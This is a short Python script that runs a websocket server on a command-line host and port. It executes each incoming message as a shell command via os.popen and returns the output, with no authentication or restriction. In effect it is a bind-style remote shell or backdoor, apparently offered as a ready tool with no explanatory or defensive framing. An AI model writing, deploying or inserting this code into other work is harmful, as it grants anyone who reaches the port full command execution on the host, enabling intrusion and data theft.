import asyncio
import websockets
import os
import sys
async def hello(websocket,path):
    try:
        while True:
            name = await websocket.recv()
            zx=os.popen(name)
            await websocket.send(zx.read())
    except Exception as r:
        print('[-] Error {}'.format(r))


start_server=websockets.serve(hello,'{}'.format(sys.argv[1]),sys.argv[2])
asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()